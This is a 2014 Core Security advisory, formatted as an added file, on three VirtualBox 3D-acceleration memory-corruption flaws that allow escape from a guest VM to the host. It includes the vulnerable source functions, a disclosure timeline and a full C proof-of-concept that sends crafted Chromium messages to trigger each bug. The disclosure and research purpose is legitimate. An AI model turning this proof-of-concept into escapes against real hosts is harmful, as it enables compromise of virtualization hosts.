@@ -1,0 +1,843 @@
+Core Security - Corelabs Advisory
+http://corelabs.coresecurity.com/
+
+Oracle VirtualBox 3D Acceleration Multiple Memory Corruption Vulnerabilities
+
+
+
+1. *Advisory Information*
+
+Title: Oracle VirtualBox 3D Acceleration Multiple Memory Corruption
+Vulnerabilities
+Advisory ID: CORE-2014-0002
+Advisory URL:
+http://www.coresecurity.com/content/oracle-virtualbox-3d-acceleration-multiple-memory-corruption-vulnerabilities
+Date published: 2014-03-11
+Date of last update: 2014-03-11
+Vendors contacted: Oracle
+Release mode: User release
+
+
+
+2. *Vulnerability Information*
+
+Class: Improper Validation of Array Index [CWE-129], Improper Validation
+of Array Index [CWE-129], Improper Validation of Array Index [CWE-129]
+Impact: Code execution
+Remotely Exploitable: Yes
+Locally Exploitable: No
+CVE Name: CVE-2014-0981, CVE-2014-0982, CVE-2014-0983
+
+
+
+3. *Vulnerability Description*
+
+VirtualBox is a general-purpose full virtualizer for x86 hardware,
+targeted at server, desktop and embedded use.
+
+VirtualBox provides -among many other features- 3D Acceleration for
+guest machines
+through its Guest Additions. This feature allows guest machines to use
+the host machine's
+GPU to render 3D graphics based on then OpenGL or Direct3D APIs.
+
+Multiple memory corruption vulnerabilities have been found in the code
+that implements
+3D Acceleration for OpenGL graphics in Oracle VirtualBox.
+These vulnerabilities could allow an attacker who is already running
+code within
+a Guest OS to escape from the virtual machine and execute arbitrary code
+on the Host OS.
+
+
+4. *Vulnerable packages*
+
+   . Oracle VirtualBox v4.2.20 and earlier.
+   . Oracle VirtualBox v4.3.6 and earlier.
+   . Other versions may be affected too but they were no checked.
+
+5. *Non-vulnerable packages*
+
+   . Oracle VirtualBox v4.3.8.
+
+6. *Credits*
+
+This vulnerability was discovered and researched by Francisco Falcon from
+Core Exploit Writers Team. The publication of this advisory was coordinated
+by Andres Blanco from Core Advisories Team.
+
+
+
+7. *Technical Description / Proof of Concept Code*
+
+VirtualBox makes use of the *Chromium*[1] open-source library
+(not to be confused with the open-source web browser) in order to
+provide 3D Acceleration for OpenGL graphics.
+
+Chromium provides remote rendering of OpenGL graphics through a
+client/server model, in which
+a client (i.e. an OpenGL application) delegates the rendering to the
+server, which has access
+to 3D-capable hardware.
+
+When 3D Acceleration is enabled in VirtualBox, OpenGL apps running
+within a Guest OS
+(acting as Chromium clients) will send rendering commands to the
+Chromium server, which is
+running in the context of the hypervisor in the Host OS.
+
+The code that handles OpenGL rendering commands on the Host side is
+prone to multiple memory
+corruption vulnerabilities, as described below.
+
+
+7.1. *VirtualBox crNetRecvReadback Memory Corruption Vulnerability*
+
+[CVE-2014-0981] The first vulnerability is caused by a *design flaw* in
+Chromium. The Chromium server makes use
+of "*network pointers*". As defined in Chromium's documentation,
+'"Network pointers are
+simply memory addresses that reside on another machine.[...] The
+networking layer will then
+take care of writing the payload data to the specified address."'[2]
+
+So the Chromium's server code, which runs in the context of the
+VirtualBox hypervisor
+in the Host OS, provides a write-what-where memory corruption primitive
+*by design*, which
+can be exploited to corrupt arbitrary memory addresses with arbitrary
+data in the hypervisor process
+from within a virtual machine.
+
+This is the code of the vulnerable function [file
+'src/VBox/GuestHost/OpenGL/util/net.c'], which can
+be reached by sending a 'CR_MESSAGE_READBACK' message to the
+'VBoxSharedCrOpenGL' service:
+
+
+/-----
+/**
+ * Called by the main receive function when we get a CR_MESSAGE_READBACK
+ * message.  Used to implement glGet*() functions.
+ */
+static void
+crNetRecvReadback( CRMessageReadback *rb, unsigned int len )
+{
+    /* minus the header, the destination pointer,
+     * *and* the implicit writeback pointer at the head. */
+
+    int payload_len = len - sizeof( *rb );
+    int *writeback;
+    void *dest_ptr;
+    crMemcpy( &writeback, &(rb->writeback_ptr), sizeof( writeback ) );
+    crMemcpy( &dest_ptr, &(rb->readback_ptr), sizeof( dest_ptr ) );
+
+    (*writeback)--;
+    crMemcpy( dest_ptr, ((char *)rb) + sizeof(*rb), payload_len );
+}
+
+     
+-----/
+
+Note that 'rb' points to a 'CRMessageReadback' structure, which is fully
+controlled by the
+application running inside a VM that is sending OpenGL rendering
+commands to the Host side.
+The 'len' parameter is also fully controlled from the Guest side, so
+it's possible to:
+
+   1. decrement the value stored at any memory address within the
+address space of the hypervisor.
+   2. write any data to any memory address within the address space of
+the hypervisor.
+
+7.2. *VirtualBox crNetRecvWriteback Memory Corruption Vulnerability*
+
+[CVE-2014-0982] The second vulnerability is closely related to the first
+one, and it's also caused by Chromium's
+"*network pointers*".
+
+This is the code of the vulnerable function [file
+'src/VBox/GuestHost/OpenGL/util/net.c'], which can
+be reached by sending a 'CR_MESSAGE_WRITEBACK' message to the
+'VBoxSharedCrOpenGL' service:
+
+
+/-----
+/**
+ * Called by the main receive function when we get a CR_MESSAGE_WRITEBACK
+ * message.  Writeback is used to implement glGet*() functions.
+ */
+static void
+crNetRecvWriteback( CRMessageWriteback *wb )
+{
+    int *writeback;
+    crMemcpy( &writeback, &(wb->writeback_ptr), sizeof( writeback ) );
+    (*writeback)--;
+}
+     
+-----/
+
+Note that 'rb' points to a 'CRMessageWriteback' structure, which is
+fully controlled by the
+application running inside a VM that is sending OpenGL rendering
+commands to the Host side, so it's possible to
+decrement the value stored at any memory address within the address
+space of the hypervisor.
+
+
+7.3. *VirtualBox crServerDispatchVertexAttrib4NubARB Memory Corruption
+Vulnerability*
+
+[CVE-2014-0983] When an OpenGL application running inside a VM sends
+rendering commands (in the form of opcodes + data for those opcodes)
+through
+a 'CR_MESSAGE_OPCODES' message, the Chromium server will handle them in
+the 'crUnpack' function.
+The code for the 'crUnpack' function is automatically generated by the
+Python script located
+at 'src/VBox/HostServices/SharedOpenGL/unpacker/unpack.py'.
+
+This function is basically a big switch statement dispatching different
+functions according to the opcode being processed:
+
+
+/-----
+void crUnpack( const void *data, const void *opcodes,
+        unsigned int num_opcodes, SPUDispatchTable *table )
+{
+    [...]
+    unpack_opcodes = (const unsigned char *)opcodes;
+    cr_unpackData = (const unsigned char *)data;
+
+    for (i = 0 ; i < num_opcodes ; i++)
+    {
+        /*crDebug("Unpacking opcode \%d", *unpack_opcodes);*/
+        switch( *unpack_opcodes )
+        {
+            case CR_ALPHAFUNC_OPCODE: crUnpackAlphaFunc(); break;
+            case CR_ARRAYELEMENT_OPCODE: crUnpackArrayElement(); break;
+            case CR_BEGIN_OPCODE: crUnpackBegin(); break;
+            [...]
+     
+-----/
+
+When the opcode being processed is 'CR_VERTEXATTRIB4NUBARB_OPCODE'
+('0xEA'),
+the function to be invoked is 'crUnpackVertexAttrib4NubARB':
+
+
+/-----
+    [...]
+    case CR_VERTEXATTRIB4NUBARB_OPCODE: crUnpackVertexAttrib4NubARB();
+break;
+    [...]
+     
+-----/
+
+The 'crUnpackVertexAttrib4NubARB' function reads 5 values from the
+opcode data sent by the Chromium client,
+and just invokes 'cr_unpackDispatch.VertexAttrib4NubARB' with those 5
+values as arguments:
+
+
+/-----
+static void crUnpackVertexAttrib4NubARB(void)
+{
+  GLuint index = READ_DATA( 0, GLuint );
+  GLubyte x = READ_DATA( 4, GLubyte );
+  GLubyte y = READ_DATA( 5, GLubyte );
+  GLubyte z = READ_DATA( 6, GLubyte );
+  GLubyte w = READ_DATA( 7, GLubyte );
+  cr_unpackDispatch.VertexAttrib4NubARB( index, x, y, z, w );
+  INCR_DATA_PTR( 8 );
+}
+     
+-----/
+
+'VertexAttrib4NubARB' is a function pointer in a dispatch table, and
+points to the function
+'crServerDispatchVertexAttrib4NubARB', whose code is generated by the
+Python script located at
+'src/VBox/HostServices/SharedOpenGL/crserverlib/server_dispatch.py':
+
+
+/-----
+void SERVER_DISPATCH_APIENTRY crServerDispatchVertexAttrib4NubARB(
+GLuint index, GLubyte x, GLubyte y, GLubyte z, GLubyte w )
+{
+  cr_server.head_spu->dispatch_table.VertexAttrib4NubARB( index, x, y,
+z, w );
+  cr_server.current.c.vertexAttrib.ub4[index] = cr_unpackData;
+}
+     
+-----/
+
+Note that the 'index' parameter, which is a 4-byte integer coming from
+an untrusted source (the opcode data
+sent by the Chromium client from the VM), is used as an index within the
+'cr_server.current.c.vertexAttrib.ub4'
+array in order to write 'cr_unpackData' (which is a pointer to the
+attacker-controlled opcode data), without
+validating that the index is within the bounds of the array.
+This issue can be leveraged to corrupt arbitrary memory with a pointer
+to attacker-controlled data.
+
+Also note that *the same vulnerability affects several functions* whose
+code is generated by the
+'src/VBox/HostServices/SharedOpenGL/crserverlib/server_dispatch.py'
+Python script:
+
+
+/-----
+Opcode CR_VERTEXATTRIB1DARB_OPCODE   [0xDE]  -> function
+crServerDispatchVertexAttrib1dARB
+Opcode CR_VERTEXATTRIB1FARB_OPCODE   [0xDF]  -> function
+crServerDispatchVertexAttrib1fARB
+Opcode CR_VERTEXATTRIB1SARB_OPCODE   [0xE0]  -> function
+crServerDispatchVertexAttrib1sARB
+Opcode CR_VERTEXATTRIB2DARB_OPCODE   [0xE1]  -> function
+crServerDispatchVertexAttrib2dARB
+Opcode CR_VERTEXATTRIB2FARB_OPCODE   [0xE2]  -> function
+crServerDispatchVertexAttrib2fARB
+Opcode CR_VERTEXATTRIB2SARB_OPCODE   [0xE3]  -> function
+crServerDispatchVertexAttrib2sARB
+Opcode CR_VERTEXATTRIB3DARB_OPCODE   [0xE4]  -> function
+crServerDispatchVertexAttrib3dARB
+Opcode CR_VERTEXATTRIB3FARB_OPCODE   [0xE5]  -> function
+crServerDispatchVertexAttrib3fARB
+Opcode CR_VERTEXATTRIB3SARB_OPCODE   [0xE6]  -> function
+crServerDispatchVertexAttrib3sARB
+Opcode CR_VERTEXATTRIB4NUBARB_OPCODE [0xEA]  -> function
+crServerDispatchVertexAttrib4NubARB
+Opcode CR_VERTEXATTRIB4DARB_OPCODE   [0xEF]  -> function
+crServerDispatchVertexAttrib4dARB
+Opcode CR_VERTEXATTRIB4FARB_OPCODE   [0xF0]  -> function
+crServerDispatchVertexAttrib4fARB
+Opcode CR_VERTEXATTRIB4SARB_OPCODE   [0xF2]  -> function
+crServerDispatchVertexAttrib4sARB
+     
+-----/
+
+
+7.4. *Proof of Concept*
+
+
+/-----
+#include "stdafx.h"
+#include <windows.h>
+#include "vboxguest2.h"
+#include "vboxguest.h"
+#include "err.h"
+#include "vboxcropenglsvc.h"
+#include "cr_protocol.h"
+
+#define VBOXGUEST_DEVICE_NAME "\\\\.\\VBoxGuest"
+
+
+HANDLE open_device(){
+    HANDLE hDevice = CreateFile(VBOXGUEST_DEVICE_NAME,
+                            GENERIC_READ | GENERIC_WRITE,
+                            FILE_SHARE_READ | FILE_SHARE_WRITE,
+                            NULL,
+                            OPEN_EXISTING,
+                            FILE_ATTRIBUTE_NORMAL,
+                            NULL);
+
+    if (hDevice == INVALID_HANDLE_VALUE){
+        printf("[-] Could not open device %s .\n", VBOXGUEST_DEVICE_NAME);
+        exit(EXIT_FAILURE);
+    }
+    printf("[+] Handle to %s: 0x%X\n", VBOXGUEST_DEVICE_NAME, hDevice);
+    return hDevice;
+
+
+}
+
+
+uint32_t do_connect(HANDLE hDevice){
+    VBoxGuestHGCMConnectInfo info;
+    DWORD cbReturned = 0;
+    BOOL rc;
+
+    memset(&info, 0, sizeof(info));
+    info.Loc.type = VMMDevHGCMLoc_LocalHost_Existing;
+    strcpy(info.Loc.u.host.achName, "VBoxSharedCrOpenGL");
+
+    rc = DeviceIoControl(hDevice, VBOXGUEST_IOCTL_HGCM_CONNECT, &info,
+sizeof(info), &info, sizeof(info), &cbReturned, NULL);
+    if (!rc){
+        printf("ERROR: DeviceIoControl failed in function do_connect()!
+LastError: %d\n", GetLastError());
+        exit(EXIT_FAILURE);
+    }
+
+    if (info.result == VINF_SUCCESS){
+        printf("HGCM connect was successful: client id =0x%x\n",
+info.u32ClientID);
+    }
+    else{
+        //If 3D Acceleration is disabled, info.result value will be -2900.
+        printf("[-] HGCM connect failed. Result: %d (Is 3D Acceleration
+enabled??)\n", info.result);
+        exit(EXIT_FAILURE);
+    }
+    return info.u32ClientID;
+}
+
+
+void do_disconnect(HANDLE hDevice, uint32_t u32ClientID){
+    BOOL rc;
+    VBoxGuestHGCMDisconnectInfo info;
+    DWORD cbReturned = 0;
+
+    memset(&info, 0, sizeof(info));
+    info.u32ClientID = u32ClientID;
+    printf("Sending VBOXGUEST_IOCTL_HGCM_DISCONNECT message...\n");
+    rc = DeviceIoControl(hDevice, VBOXGUEST_IOCTL_HGCM_DISCONNECT,
+&info, sizeof(info), &info, sizeof(info), &cbReturned, NULL);
+    if (!rc){
+        printf("ERROR: DeviceIoControl failed in function
+do_disconnect()! LastError: %d\n", GetLastError());
+        exit(EXIT_FAILURE);
+    }
+
+    if (info.result == VINF_SUCCESS){
+        printf("HGCM disconnect was successful.\n");
+    }
+    else{
+        printf("[-] HGCM disconnect failed. Result: %d\n", info.result);
+        exit(EXIT_FAILURE);
+    }
+
+}
+
+
+void set_version(HANDLE hDevice, uint32_t u32ClientID){
+    CRVBOXHGCMSETVERSION parms;
+    DWORD cbReturned = 0;
+    BOOL rc;
+
+    memset(&parms, 0, sizeof(parms));
+    parms.hdr.result      = VERR_WRONG_ORDER;
+    parms.hdr.u32ClientID = u32ClientID;
+    parms.hdr.u32Function = SHCRGL_GUEST_FN_SET_VERSION;
+    parms.hdr.cParms      = SHCRGL_CPARMS_SET_VERSION;
+
+    parms.vMajor.type      = VMMDevHGCMParmType_32bit;
+    parms.vMajor.u.value32 = CR_PROTOCOL_VERSION_MAJOR;
+    parms.vMinor.type      = VMMDevHGCMParmType_32bit;
+    parms.vMinor.u.value32 = CR_PROTOCOL_VERSION_MINOR;
+
+    rc = DeviceIoControl(hDevice, VBOXGUEST_IOCTL_HGCM_CALL, &parms,
+sizeof(parms), &parms, sizeof(parms), &cbReturned, NULL);
+
+    if (!rc){
+        printf("ERROR: DeviceIoControl failed in function set_version()!
+LastError: %d\n", GetLastError());
+        exit(EXIT_FAILURE);
+    }
+
+    if (parms.hdr.result == VINF_SUCCESS){
+        printf("HGCM Call successful. cbReturned: 0x%X.\n", cbReturned);
+    }
+    else{
+        printf("Host didn't accept our version.\n");
+        exit(EXIT_FAILURE);
+    }
+}
+
+
+void set_pid(HANDLE hDevice, uint32_t u32ClientID){
+    CRVBOXHGCMSETPID parms;
+    DWORD cbReturned = 0;
+    BOOL rc;
+
+    memset(&parms, 0, sizeof(parms));
+    parms.hdr.result      = VERR_WRONG_ORDER;
+    parms.hdr.u32ClientID = u32ClientID;
+    parms.hdr.u32Function = SHCRGL_GUEST_FN_SET_PID;
+    parms.hdr.cParms      = SHCRGL_CPARMS_SET_PID;
+
+    parms.u64PID.type     = VMMDevHGCMParmType_64bit;
+    parms.u64PID.u.value64 = GetCurrentProcessId();
+
+    rc = DeviceIoControl(hDevice, VBOXGUEST_IOCTL_HGCM_CALL, &parms,
+sizeof(parms), &parms, sizeof(parms), &cbReturned, NULL);
+
+    if (!rc){
+        printf("ERROR: DeviceIoControl failed in function set_pid()!
+LastError: %d\n", GetLastError());
+        exit(EXIT_FAILURE);
+    }
+
+    if (parms.hdr.result == VINF_SUCCESS){
+        printf("HGCM Call successful. cbReturned: 0x%X.\n", cbReturned);
+    }
+    else{
+        printf("Host didn't like our PID %d\n", GetCurrentProcessId());
+        exit(EXIT_FAILURE);
+    }
+
+}
+
+
+/* Triggers the vulnerability in the crNetRecvReadback function. */
+void trigger_message_readback(HANDLE hDevice, uint32_t u32ClientID){
+    CRVBOXHGCMINJECT parms;
+    DWORD cbReturned = 0;
+    BOOL rc;
+    char mybuf[1024];
+    CRMessageReadback msg;
+
+    memset(&msg, 0, sizeof(msg));
+    msg.header.type = CR_MESSAGE_READBACK;
+    msg.header.conn_id = 0x8899;
+
+
+    //This address will be decremented by 1
+    *((DWORD *)&msg.writeback_ptr.ptrSize) = 0x88888888;
+    //Destination address for the memcpy
+    *((DWORD *)&msg.readback_ptr.ptrSize) = 0x99999999;
+
+    memcpy(&mybuf, &msg, sizeof(msg));
+    strcpy(mybuf + sizeof(msg), "Hi hypervisor!");
+
+    memset(&parms, 0, sizeof(parms));
+    parms.hdr.result      = VERR_WRONG_ORDER;
+    parms.hdr.u32ClientID = u32ClientID;
+    parms.hdr.u32Function = SHCRGL_GUEST_FN_INJECT;
+    parms.hdr.cParms      = SHCRGL_CPARMS_INJECT;
+
+    parms.u32ClientID.type       = VMMDevHGCMParmType_32bit;
+    parms.u32ClientID.u.value32  = u32ClientID;
+
+    parms.pBuffer.type                   = VMMDevHGCMParmType_LinAddr_In;
+    parms.pBuffer.u.Pointer.size         = sizeof(mybuf); //size for the
+memcpy: sizeof(mybuf) - 0x18
+    parms.pBuffer.u.Pointer.u.linearAddr = (uintptr_t) mybuf;
+
+    rc = DeviceIoControl(hDevice, VBOXGUEST_IOCTL_HGCM_CALL, &parms,
+sizeof(parms), &parms, sizeof(parms), &cbReturned, NULL);
+
+    if (!rc){
+        printf("ERROR: DeviceIoControl failed in function
+trigger_message_readback()!. LastError: %d\n", GetLastError());
+        exit(EXIT_FAILURE);
+    }
+
+    if (parms.hdr.result == VINF_SUCCESS){
+        printf("HGCM Call successful. cbReturned: 0x%X.\n", cbReturned);
+    }
+    else{
+        printf("HGCM Call failed. Result: %d\n", parms.hdr.result);
+        exit(EXIT_FAILURE);
+    }
+}
+
+
+/* Triggers the vulnerability in the crNetRecvWriteback function. */
+void trigger_message_writeback(HANDLE hDevice, uint32_t u32ClientID){
+    CRVBOXHGCMINJECT parms;
+    DWORD cbReturned = 0;
+    BOOL rc;
+    char mybuf[512];
+    CRMessage msg;
+
+    memset(&mybuf, 0, sizeof(mybuf));
+
+    memset(&msg, 0, sizeof(msg));
+    msg.writeback.header.type = CR_MESSAGE_WRITEBACK;
+    msg.writeback.header.conn_id = 0x8899;
+    //This address will be decremented by 1
+    *((DWORD *)msg.writeback.writeback_ptr.ptrSize) = 0xAABBCCDD;
+
+    memcpy(&mybuf, &msg, sizeof(msg));
+    strcpy(mybuf + sizeof(msg), "dummy");
+
+    memset(&parms, 0, sizeof(parms));
+    parms.hdr.result      = VERR_WRONG_ORDER;
+    parms.hdr.u32ClientID = u32ClientID;
+    parms.hdr.u32Function = SHCRGL_GUEST_FN_INJECT;
+    parms.hdr.cParms      = SHCRGL_CPARMS_INJECT;
+
+    parms.u32ClientID.type       = VMMDevHGCMParmType_32bit;
+    parms.u32ClientID.u.value32  = u32ClientID;
+
+    parms.pBuffer.type                   = VMMDevHGCMParmType_LinAddr_In;
+    parms.pBuffer.u.Pointer.size         = sizeof(mybuf);
+    parms.pBuffer.u.Pointer.u.linearAddr = (uintptr_t) mybuf;
+
+
+    rc = DeviceIoControl(hDevice, VBOXGUEST_IOCTL_HGCM_CALL, &parms,
+sizeof(parms), &parms, sizeof(parms), &cbReturned, NULL);
+
+    if (!rc){
+        printf("ERROR: DeviceIoControl failed in function
+trigger_message_writeback()! LastError: %d\n", GetLastError());
+        exit(EXIT_FAILURE);
+    }
+
+    if (parms.hdr.result == VINF_SUCCESS){
+        printf("HGCM Call successful. cbReturned: 0x%X.\n", cbReturned);
+    }
+    else{
+        printf("HGCM Call failed. Result: %d\n", parms.hdr.result);
+        exit(EXIT_FAILURE);
+    }
+
+}
+
+
+/* Triggers the vulnerability in the crServerDispatchVertexAttrib4NubARB
+function. */
+void trigger_opcode_0xea(HANDLE hDevice, uint32_t u32ClientID){
+    CRVBOXHGCMINJECT parms;
+    char mybuf[0x10f0];
+    DWORD cbReturned = 0;
+    BOOL rc;
+
+    unsigned char opcodes[] = {0xFF, 0xea, 0x02, 0xf7};
+    DWORD opcode_data[] =
+                    {0x08,                        //Advance 8 bytes
+after executing opcode 0xF7, subopcode 0x30
+                    0x30,                        //Subopcode for opcode 0xF7
+                    0x331,                        //Argument for opcode 0x02
+                    0xFFFCFA4B,                    //This is the
+negative index used to trigger the memory corruption
+                    0x41414141};                //Junk
+
+    CRMessageOpcodes msg_opcodes;
+
+    memset(&mybuf, 0, sizeof(mybuf));
+
+    memset(&msg_opcodes, 0, sizeof(msg_opcodes));
+    msg_opcodes.header.conn_id = 0x8899;
+    msg_opcodes.header.type = CR_MESSAGE_OPCODES;
+    msg_opcodes.numOpcodes = sizeof(opcodes);
+
+    char *offset = (char *)&mybuf;
+    memcpy(offset, &msg_opcodes, sizeof(msg_opcodes));
+    offset += sizeof(msg_opcodes);
+
+    /*----- Opcodes -----*/
+    memcpy(offset, &opcodes, sizeof(opcodes));
+    offset += sizeof(opcodes);
+
+    /*----- data for the opcodes -----*/
+    memcpy(offset, &opcode_data, sizeof(opcode_data));
+    offset += sizeof(opcode_data);
+
+
+    memset(&parms, 0, sizeof(parms));
+    parms.hdr.result      = 0;
+    parms.hdr.u32ClientID = u32ClientID;
+    parms.hdr.u32Function = SHCRGL_GUEST_FN_INJECT;
+    parms.hdr.cParms      = SHCRGL_CPARMS_INJECT;
+
+    parms.u32ClientID.type       = VMMDevHGCMParmType_32bit;
+    parms.u32ClientID.u.value32  = u32ClientID;
+
+    parms.pBuffer.type                   = VMMDevHGCMParmType_LinAddr_In;
+    parms.pBuffer.u.Pointer.size         = sizeof(mybuf);
+    parms.pBuffer.u.Pointer.u.linearAddr = (uintptr_t) mybuf;
+
+    rc = DeviceIoControl(hDevice, VBOXGUEST_IOCTL_HGCM_CALL, &parms,
+sizeof(parms), &parms, sizeof(parms), &cbReturned, NULL);
+
+    if (!rc){
+        printf("ERROR: DeviceIoControl failed in function
+trigger_opcode_0xea()! LastError: %d\n", GetLastError());
+        exit(EXIT_FAILURE);
+    }
+
+    if (parms.hdr.result == VINF_SUCCESS){
+        printf("HGCM Call successful. cbReturned: 0x%X.\n", cbReturned);
+    }
+    else{
+        printf("HGCM Call failed. Result: %d\n", parms.hdr.result);
+        exit(EXIT_FAILURE);
+    }
+
+}
+
+
+void poc(int option){
+    HANDLE hDevice;
+    uint32_t u32ClientID;
+
+    /* Connect to the VBoxSharedCrOpenGL service */
+    hDevice = open_device();
+    u32ClientID = do_connect(hDevice);
+
+    /* Set version and PID */
+    set_version(hDevice, u32ClientID);
+    set_pid(hDevice, u32ClientID);
+
+    switch (option){
+    case 1:
+        printf("[1] triggering the first bug...\n");
+        trigger_message_readback(hDevice, u32ClientID);
+        break;
+    case 2:
+        printf("[2] triggering the second bug...\n");
+        trigger_message_writeback(hDevice, u32ClientID);
+        break;
+    case 3:
+        printf("[3] triggering the third bug...\n");
+        trigger_opcode_0xea(hDevice, u32ClientID);
+        break;
+    default:
+        printf("[!] Unknown option %d.\n", option);
+    }
+
+    /* Disconnect from the VBoxSharedCrOpenGL service */
+    do_disconnect(hDevice, u32ClientID);
+    CloseHandle(hDevice);
+}
+
+
+
+
+int main(int argc, char* argv[])
+{
+    if (argc < 2){
+        printf("Usage: %s <option number>\n\n", argv[0]);
+        printf("* Option 1: trigger the vulnerability in the
+crNetRecvReadback function.\n");
+        printf("* Option 2: trigger the vulnerability in the
+crNetRecvWriteback function.\n");
+        printf("* Option 3: trigger the vulnerability in the
+crServerDispatchVertexAttrib4NubARB function.\n");
+        exit(1);
+    }
+    poc(atoi(argv[1]));
+}
+     
+-----/
+
+
+8. *Report Timeline*
+. 2014-02-11:
+Core Security Technologies notifies the VirtualBox team of the
+vulnerability.
+Publication date is set for March 4th, 2014.
+
+
+. 2014-02-12:
+
+Vendor acknowledges the receipt of the information. Vendor asks to
+coordinate
+the release for April 15, 2014 which is the earliest possible date for
+publishing
+this issue from Oracle.
+
+
+. 2014-02-12:
+
+Core schedules the advisory publication for April 15, 2014 and asks
+for regular status reports.
+
+
+. 2014-03-04:
+
+First release date missed.
+
+
+. 2014-03-07:
+
+Vendor releases fixes of some affected versions [3][4].
+        
+
+. 2014-03-07:
+
+Core notifies that, given that some patches were disclosed,
+the advisory will we released as user release ASAP.
+
+
+. 2014-03-07:
+
+Vendor asks for delaying the advisory publication given that
+some versions are still vulnerable.
+
+
+. 2014-03-10:
+
+Core notifies that the advisory is going to be published because
+once the fixes have been made public the vulnerability is public as well.
+
+
+. 2014-03-10:
+
+Vendor notifies that they will not include credit to Core researchers
+given that the advisory is being published before a fix is available to
+all affected versions.
+
+
+. 2014-03-11:
+
+Advisory CORE-2014-0002 published as user release.
+
+
+
+9. *References*
+
+[1] http://chromium.sourceforge.net/
+[2] http://chromium.sourceforge.net/doc/howitworks.html
+[3] https://www.virtualbox.org/changeset/50441/vbox
+[4] https://www.virtualbox.org/changeset/50437/vbox
+
+
+10. *About CoreLabs*
+
+CoreLabs, the research center of Core Security Technologies, is charged
+with anticipating
+the future needs and requirements for information security technologies.
+We conduct our research in several important areas of computer security
+including system vulnerabilities, cyber attack planning and simulation,
+source code auditing, and cryptography. Our results include problem
+formalization, identification of vulnerabilities, novel solutions and
+prototypes for new technologies. CoreLabs regularly publishes security
+advisories, technical papers, project information and shared software
+tools for public use at:
+http://corelabs.coresecurity.com.
+
+
+
+11. *About Core Security Technologies*
+
+
+Core Security Technologies enables organizations to get ahead of threats
+with security test and measurement solutions that continuously identify
+and demonstrate real-world exposures to their most critical assets. Our
+customers can gain real visibility into their security standing, real
+validation of their security controls, and real metrics to more
+effectively secure their organizations.
+
+
+
+Core Security's software solutions build on over a decade of trusted
+research and leading-edge threat expertise from the company's Security
+Consulting Services, CoreLabs and Engineering groups. Core Security
+Technologies can be reached at +1 (617) 399-6980 or on the Web at:
+http://www.coresecurity.com.
+
+
+
+12. *Disclaimer*
+
+
+The contents of this advisory are copyright
+(c) 2014 Core Security Technologies and (c) 2014 CoreLabs,
+and are licensed under a Creative Commons
+Attribution Non-Commercial Share-Alike 3.0 (United States) License:
+http://creativecommons.org/licenses/by-nc-sa/3.0/us/
+
+
+13. *PGP/GPG Keys*
+
+
+This advisory has been signed with the GPG key of Core Security
+Technologies advisories
+team, which is available for download at
+http://www.coresecurity.com/files/attachments/core_security_advisories.asc.
